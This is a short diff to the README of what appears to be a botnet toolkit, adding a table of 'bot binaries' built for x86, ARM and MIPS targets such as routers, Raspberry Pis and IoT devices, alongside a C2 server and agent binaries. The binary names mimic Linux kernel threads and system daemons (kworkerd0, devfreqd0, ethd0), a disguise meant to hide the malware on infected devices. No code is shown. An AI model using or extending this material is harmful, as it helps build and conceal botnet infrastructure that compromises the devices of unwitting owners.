@@ -115,6 +115,21 @@ go version  # verify installation
    | C2 Server | `./server` |
    | Agent Binaries | `./bins/` |
    | Configuration | `setup_config.txt` |
+   
+
+### Bot Binaries
+
+Bot binaries are in `bins/`:
+
+| Binary | Architecture | Use Case |
+|--------|--------------|----------|
+| ethd0 | x86_64 (amd64) | Servers, desktops |
+| kworkerd0 | x86 (386) | 32-bit systems |
+| ip6addrd | ARM64 | Raspberry Pi 4, phones |
+| mdsync1 | ARMv7 | Raspberry Pi 2/3 |
+| deferwqd | MIPS | Routers |
+| devfreqd0 | MIPSLE | Routers (little-endian) |
+| *...and 8 more* | Various | IoT, embedded |
 
 ---
 
